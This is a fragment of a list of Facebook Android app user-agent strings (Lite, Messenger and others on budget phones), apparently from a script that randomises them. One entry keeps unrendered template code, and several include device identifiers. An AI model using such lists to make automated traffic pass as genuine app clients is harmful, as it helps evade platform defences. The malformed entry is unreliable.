   "Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669 Build/SP1A.210812.016) [FBAN/EMA;FBBV/560811077;FBAV/392.0.0.13.114;FBDV/Infinix X669;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/560811070;FBAV/392.0.0.13.114;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A125U1 Build/SP1A.210812.016) [FBAN/EMA;FBBV/565431514;FBAV/394.0.0.11.107;FBDV/SM-A125U1;FBSV/12;FBCX/OkHttp3;FBDM/{density=1.875}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/565431512;FBAV/394.0.0.11.107;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032M Build/SP1A.210812.016) [FBAN/EMA;FBBV/565431512;FBAV/394.0.0.11.107;FBDV/SM-A032M;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/565431512;FBAV/394.0.0.11.107;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF7 Build/SP1A.210812.016) [FBAN/EMA;FBBV/565431514;FBAV/394.0.0.11.107;FBDV/TECNO BF7;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032M Build/SP1A.210812.016) [FBAN/EMA;FBBV/565431512;FBAV/394.0.0.11.107;FBDV/SM-A032M;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6516 Build/SP1A.210812.001) [FBAN/EMA;FBBV/565431512;FBAV/394.0.0.11.107;FBDV/Infinix X6516;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/EMA;FBBV/565431512;FBAV/394.0.0.11.107;FBDV/SM-A032F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO KI5k Build/SP1A.210812.016) [FBAN/EMA;FBBV/565431514;FBAV/394.0.0.11.107;FBDV/TECNO KI5k;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 11; U319AA Build/RP1A.200720.011) [FBAN/FB4A;FBAV/407.0.0.30.97;FBPN/com.facebook.katana;FBLC/en_US;FBBV/458543263;FBCR/AT&amp;amp- T;FBMF/TINNO;FBBD/ATT;FBDV/U319AA;FBSV/11;FBCA/armeabi- v7a:armeabi;FBDM/{density=1.875,width=720,height=1350};FB_FW/1;FBRV/0;]", 
   "Dalvik/2.1.0 (Linux; U; Android 13; SM-A716U Build/TP1A.220624.014) [FBAN/Orca- Android;FBAV/422.0.0.18.107;FBPN/com.facebook.orca;FBLC/en_US;FBBV/505323571;FBCR/AT&amp;amp- T;FBMF/samsung;FBBD/samsung;FBDV/SM-A716U;FBSV/13;FBCA/arm64- v8a:null;FBDM/{density=3.375,width=1080,height=2147};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 11; CPH2499 Build/TP1A.220905.001) [FBAN/FB4A;FBAV/{str(rr(410,450))}.0.0.{str(rr(1,9))}.{str(rr(50,110))};FBPN/com.facebook.katana;FBLC/id_ID;FBBV/{str(rr(410000000,499999999))};FBCR/Indosat Ooredoo;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2499;FBSV/11;FBCA/arm64-v8a:null;FBDM/&quot;+&quot;{density=2.75,width=2307,height=1036};FB_FW/1;FBRV/0;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; 220733SG Build/SP1A.210812.016) [FBAN/EMA;FBBV/565431512;FBAV/394.0.0.11.107;FBDV/220733SG;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/568004586;FBAV/395.0.0.13.108;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; Nokia 2.4 Build/SP1A.210812.016) [FBAN/EMA;FBBV/565431512;FBAV/394.0.0.11.107;FBDV/Nokia 2.4;FBSV/12;FBCX/OkHttp3;FBDM/{density=1.75}]", 
   "Dalvik/2.1.0 (Linux; U; Android 13; SM-A037U Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/423.0.0.25.113;FBPN/com.facebook.orca;FBLC/en_US;FBBV/507807851;FBCR/AT&amp;amp-T;FBMF/samsung;FBBD/samsung;FBDV/SM-A037U;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1471};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; Airtel Imagine Build/SP1A.210812.016) [FBAN/EMA;FBBV/568004586;FBAV/395.0.0.13.108;FBDV/Airtel Imagine;FBSV/12;FBCX/OkHttp3;FBDM/{density=1.25}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; Nokia C02 Build/SP1A.210812.016) [FBAN/EMA;FBBV/568004586;FBAV/395.0.0.13.108;FBDV/Nokia C02;FBSV/12;FBCX/OkHttp3;FBDM/{density=1.25}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6516 Build/SP1A.210812.001) [FBAN/EMA;FBBV/568004586;FBAV/395.0.0.13.108;FBDV/Infinix X6516;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; Airtel Imagine Build/SP1A.210812.016) [FBAN/EMA;FBBV/565431512;FBAV/394.0.0.11.107;FBDV/Airtel Imagine;FBSV/12;FBCX/OkHttp3;FBDM/{density=1.25}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; Airtel Imagine Build/SP1A.210812.016) [FBAN/EMA;FBBV/570020901;FBAV/396.0.0.9.115;FBDV/Airtel Imagine;FBSV/12;FBCX/OkHttp3;FBDM/{density=1.25}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/570020901;FBAV/396.0.0.9.115;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/570020901;FBAV/396.0.0.9.115;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/EMA;FBBV/570020901;FBAV/396.0.0.9.115;FBDV/SM-A032F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 10; MAR-LX1A Build/HUAWEIMAR-L21A) [FBAN/Orca-Android;FBAV/446.0.0.44.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/568833322;FBCR/TELEKOM.RO;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/MAR-LX1A;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2107};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032M Build/SP1A.210812.016) [FBAN/EMA;FBBV/570020901;FBAV/396.0.0.9.115;FBDV/SM-A032M;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO CH6 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/448.0.0.47.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/572991943;FBCR/MTN;FBMF/TECNO MOBILE LIMITED;FBBD/TECNO;FBDV/TECNO CH6;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2351};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 11; SM-A107F Build/RP1A.200720.012) [FBAN/EMA;FBBV/570020901;FBAV/396.0.0.9.115;FBDV/SM-A107F;FBSV/11;FBCX/OkHttp3;FBDM/{density=1.75}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/572287873;FBAV/397.0.0.11.117;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/572287873;FBAV/397.0.0.11.117;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; Airtel Imagine Build/SP1A.210812.016) [FBAN/EMA;FBBV/572287873;FBAV/397.0.0.11.117;FBDV/Airtel Imagine;FBSV/12;FBCX/OkHttp3;FBDM/{density=1.25}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; Nokia C02 Build/SP1A.210812.016) [FBAN/EMA;FBBV/572287873;FBAV/397.0.0.11.117;FBDV/Nokia C02;FBSV/12;FBCX/OkHttp3;FBDM/{density=1.25}]", 
   "Dalvik/2.1.0 (Linux; U; Android 11; RMX2193 Build/RP1A.200720.011) [FBAN/EMA;FBBV/572287840;FBAV/397.0.0.11.117;FBDV/RMX2193;FBSV/11;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/574776121;FBAV/398.0.0.13.113;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF7 Build/SP1A.210812.016) [FBAN/EMA;FBBV/574776122;FBAV/398.0.0.13.113;FBDV/TECNO BF7;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6516 Build/SP1A.210812.001) [FBAN/EMA;FBBV/574776121;FBAV/398.0.0.13.113;FBDV/Infinix X6516;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/577783571;FBAV/399.0.0.16.120;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF7 Build/SP1A.210812.016) [FBAN/EMA;FBBV/577783584;FBAV/399.0.0.16.120;FBDV/TECNO BF7;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF7 Build/SP1A.210812.016) [FBAN/EMA;FBBV/577783584;FBAV/399.0.0.16.120;FBDV/TECNO BF7;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/EMA;FBBV/577783571;FBAV/399.0.0.16.120;FBDV/SM-A032F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A217F Build/SP1A.210812.016) [FBAN/EMA;FBBV/577783584;FBAV/399.0.0.16.120;FBDV/SM-A217F;FBSV/12;FBCX/OkHttp3;FBDM/{density=1.75}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; Airtel Imagine Build/SP1A.210812.016) [FBAN/EMA;FBBV/577783571;FBAV/399.0.0.16.120;FBDV/Airtel Imagine;FBSV/12;FBCX/OkHttp3;FBDM/{density=1.25}]", 
   "Dalvik/2.1.0 (Linux; U; Android 13; SM-A032F Build/TP1A.220624.014) [FBAN/EMA;FBBV/577783571;FBAV/399.0.0.16.120;FBDV/SM-A032F;FBSV/13;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6516 Build/SP1A.210812.001) [FBAN/EMA;FBBV/577783571;FBAV/399.0.0.16.120;FBDV/Infinix X6516;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/EMA;FBBV/577783571;FBAV/399.0.0.16.120;FBDV/SM-A032F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; Nokia C02 Build/SP1A.210812.016) [FBAN/EMA;FBBV/577783571;FBAV/399.0.0.16.120;FBDV/Nokia C02;FBSV/12;FBCX/OkHttp3;FBDM/{density=1.25}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-G988B Build/SP1A.210812.016) [FBAN/EMA;FBBV/577783584;FBAV/399.0.0.16.120;FBDV/SM-G988B;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.625}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032M Build/SP1A.210812.016) [FBAN/EMA;FBBV/577783571;FBAV/399.0.0.16.120;FBDV/SM-A032M;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; 21121119SG Build/SP1A.210812.016) [FBAN/AppManager;FBAV/104.0.18;FBLC/fr_FR;FBBV/564596787;FBCR/EVATIS;FBMF/Xiaomi;FBBD/Redmi;FBDV/21121119SG;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2253};FB_FW/1;FBAS/31;FBBPN/selene_global;FBBPD/selene;FBXDID/0efb8cec-3ffe-4a62-b202-b99556b95c75;FBLR/0;FBXPID/xiaomi:d3120e97-318f-0810-4666-a1b0610476f4;FBOXIV/564596696;FBFSM/63801;FBLSM/63801;FBXPR/1;FBTOS/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A217M Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/449.0.0.47.111;FBPN/com.facebook.orca;FBLC/en_US;FBBV/575676944;FBCR/IT&amp;amp-E;FBMF/samsung;FBBD/samsung;FBDV/SM-A217M;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1448};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A135F Build/SP1A.210812.016) [FBAN/EMA;FBBV/582294231;FBAV/400.1.0.16.136;FBDV/SM-A135F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.8125}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; itel S663L Build/SP1A.210812.001) [FBAN/EMA;FBBV/577783571;FBAV/399.0.0.16.120;FBDV/itel S663L;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A315G Build/SP1A.210812.016) [FBAN/AppManager;FBAV/104.0.18;FBLC/en_GB;FBBV/564596787;FBCR/PalauCel;FBMF/samsung;FBBD/samsung;FBDV/SM-A315G;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2195};FB_FW/1;FBAS/31;FBBPN/a31nsdx;FBBPD/a31;FBXDID/f40af36b-b278-4b53-abb8-970b0d44552e;FBLR/0;FBXPID/samsung:dec1cc9c-1497-4aab-b953-cee702c2a481;FBOXIV/564596696;FBFSM/55201;FBLSM/55201;FBXPR/1;FBTOS/3;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669 Build/SP1A.210812.016) [FBAN/EMA;FBBV/582294236;FBAV/400.1.0.16.136;FBDV/Infinix X669;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 11; TECNO KG5j Build/RP1A.200720.011) [FBAN/EMA;FBBV/577783571;FBAV/399.0.0.16.120;FBDV/TECNO KG5j;FBSV/11;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A125F Build/SP1A.210812.016) [FBAN/EMA;FBBV/490622142;FBAV/362.0.0.10.67;FBDV/SM-A125F;FBLC/en_US;FBNG/4G;FBMNT/METERED;FBDM/{density=1.875}]", 
   "Dalvik/2.1.0 (Linux; U; Android 9; Infinix X650C Build/PPR1.180610.011) [FBAN/EMA;FBBV/555772035;FBAV/389.0.0.10.118;FBDV/Infinix X650C;FBLC/id_ID;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=2.05625}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/582294231;FBAV/400.1.0.16.136;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/EMA;FBBV/582294231;FBAV/400.1.0.16.136;FBDV/SM-A032F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6516 Build/SP1A.210812.001) [FBAN/EMA;FBBV/582294231;FBAV/400.1.0.16.136;FBDV/Infinix X6516;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/EMA;FBBV/582294231;FBAV/400.1.0.16.136;FBDV/SM-A032F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; 220733SFG Build/SP1A.210812.016) [FBAN/EMA;FBBV/582294231;FBAV/400.1.0.16.136;FBDV/220733SFG;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 13; SM-A032M Build/TP1A.220624.014) [FBAN/EMA;FBBV/582294231;FBAV/400.1.0.16.136;FBDV/SM-A032M;FBSV/13;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF7 Build/SP1A.210812.016) [FBAN/EMA;FBBV/582294236;FBAV/400.1.0.16.136;FBDV/TECNO BF7;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; CPH2471 Build/SP1A.210812.016) [FBAN/EMA;FBBV/582294236;FBAV/400.1.0.16.136;FBDV/CPH2471;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A037U1 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/452.0.0.50.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/584563264;FBCR/IT&amp;amp-E;FBMF/samsung;FBBD/samsung;FBDV/SM-A037U1;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1471};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/584459388;FBAV/401.0.0.14.110;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/584459388;FBAV/401.0.0.14.110;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; 220733SG Build/SP1A.210812.016) [FBAN/EMA;FBBV/584459388;FBAV/401.0.0.14.110;FBDV/220733SG;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 13; moto e13 Build/TLA33.105-285) [FBAN/EMA;FBBV/584459393;FBAV/401.0.0.14.110;FBDV/moto e13;FBSV/13;FBCX/OkHttp3;FBDM/{density=1.75}]", 
   "Dalvik/2.1.0 (Linux; U; Android 13; M2101K7BG Build/TP1A.220624.014) [FBAN/FB4A;FBAV/458.0.0.38.86;FBPN/com.facebook.katana;FBLC/en_US;FBBV/584018436;FBCR/UNEFON;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2101K7BG;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2177};FB_FW/1;FBRV/585636396;]", 
   "Dalvik/2.1.0 (Linux; U; Android 13; M2101K7BG Build/TP1A.220624.014) [FBAN/FB4A;FBAV/458.0.0.38.86;FBPN/com.facebook.katana;FBLC/en_US;FBBV/584018436;FBCR/UNEFON;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2101K7BG;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2177};FB_FW/1;FBRV/585636396;]", 
   "Dalvik/2.1.0 (Linux; U; Android 13; moto e13 Build/TLA33.105-285) [FBAN/EMA;FBBV/586070141;FBAV/402.0.0.10.113;FBDV/moto e13;FBSV/13;FBCX/OkHttp3;FBDM/{density=1.75}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/586070135;FBAV/402.0.0.10.113;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/EMA;FBBV/586070135;FBAV/402.0.0.10.113;FBDV/SM-A032F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/586070135;FBAV/402.0.0.10.113;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 13; SM-A032M Build/TP1A.220624.014) [FBAN/EMA;FBBV/586070135;FBAV/402.0.0.10.113;FBDV/SM-A032M;FBSV/13;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO CH6 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/453.0.0.38.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/586043100;FBCR/MTN;FBMF/TECNO MOBILE LIMITED;FBBD/TECNO;FBDV/TECNO CH6;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2351};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A525F Build/SP1A.210812.016) [FBAN/AppManager;FBAV/105.0.21;FBLC/ru_RU;FBBV/574097878;FBCR/TM CELL;FBMF/samsung;FBBD/samsung;FBDV/SM-A525F;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2168};FB_FW/1;FBAS/31;FBBPN/a52qnsxx;FBBPD/a52q;FBXDID/07da8a38-1b42-4598-9f1f-4550be332e53;FBLR/0;FBXPID/samsung:dec1cc9c-1497-4aab-b953-cee702c2a481;FBOXIV/574097112;FBFSM/43802;FBLSM/43802;FBXPR/1;FBTOS/3;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032M Build/SP1A.210812.016) [FBAN/EMA;FBBV/586070135;FBAV/402.0.0.10.113;FBDV/SM-A032M;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6516 Build/SP1A.210812.001) [FBAN/EMA;FBBV/586070135;FBAV/402.0.0.10.113;FBDV/Infinix X6516;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; T431A Build/SP1A.210812.016) [FBAN/EMA;FBBV/586070135;FBAV/402.0.0.10.113;FBDV/T431A;FBSV/12;FBCX/OkHttp3;FBDM/{density=1.5}]", 
   "Dalvik/2.1.0 (Linux; U; Android 13; moto e13 Build/TLA33.105-285) [FBAN/EMA;FBBV/588578389;FBAV/403.0.0.8.124;FBDV/moto e13;FBSV/13;FBCX/OkHttp3;FBDM/{density=1.75}]", 
   "Dalvik/2.1.0 (Linux; U; Android 13; SM-A032M Build/TP1A.220624.014) [FBAN/EMA;FBBV/588578387;FBAV/403.0.0.8.124;FBDV/SM-A032M;FBSV/13;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/588578387;FBAV/403.0.0.8.124;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF7 Build/SP1A.210812.016) [FBAN/EMA;FBBV/588578389;FBAV/403.0.0.8.124;FBDV/TECNO BF7;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 10; SM-A605K Build/QP1A.190711.020) [FBAN/EMA;FBBV/565431512;FBAV/394.0.0.11.107;FBDV/SM-A605K;FBSV/10;FBCX/OkHttp3;FBDM/{density=2.625}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO KI5k Build/SP1A.210812.016) [FBAN/EMA;FBBV/588578389;FBAV/403.0.0.8.124;FBDV/TECNO KI5k;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/EMA;FBBV/572287839;FBAV/397.0.0.11.117;FBDV/SM-A032F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RHS32.20-42-10-4-11) [FBAN/Orca-Android;FBAV/455.0.0.40.107;FBPN/com.facebook.orca;FBLC/en_US;FBBV/591231637;FBCR/DOCOMO PACIFIC;FBMF/motorola;FBBD/motorola;FBDV/moto g pure;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.4875001,width=720,height=1475};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; Airtel Imagine Build/SP1A.210812.016) [FBAN/EMA;FBBV/586070135;FBAV/402.0.0.10.113;FBDV/Airtel Imagine;FBSV/12;FBCX/OkHttp3;FBDM/{density=1.25}]", 
   "Dalvik/2.1.0 (Linux; U; Android 13; SM-A032M Build/TP1A.220624.014) [FBAN/EMA;FBBV/591337784;FBAV/404.0.0.12.118;FBDV/SM-A032M;FBSV/13;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/454.0.0.37.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/588686349;FBCR/NTA;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO CH6 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/455.0.0.40.107;FBPN/com.facebook.orca;FBLC/en_US;FBBV/591231276;FBCR/MTN;FBMF/TECNO MOBILE LIMITED;FBBD/TECNO;FBDV/TECNO CH6;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2351};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO LF7 Build/SP1A.210812.016) [FBAN/EMA;FBBV/591337788;FBAV/404.0.0.12.118;FBDV/TECNO LF7;FBSV/12;FBCX/OkHttp3;FBDM/{density=3.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; VIMOQ A631LO Build/SP1A.210812.016) [FBAN/EMA;FBBV/591337784;FBAV/404.0.0.12.118;FBDV/VIMOQ A631LO;FBSV/12;FBCX/OkHttp3;FBDM/{density=1.25}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032M Build/SP1A.210812.016) [FBAN/EMA;FBBV/591337784;FBAV/404.0.0.12.118;FBDV/SM-A032M;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 13; moto e13 Build/TLAS33.105-285-1) [FBAN/EMA;FBBV/591337788;FBAV/404.0.0.12.118;FBDV/moto e13;FBSV/13;FBCX/OkHttp3;FBDM/{density=1.75}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/EMA;FBBV/591337784;FBAV/404.0.0.12.118;FBDV/SM-A032F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/591337784;FBAV/404.0.0.12.118;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
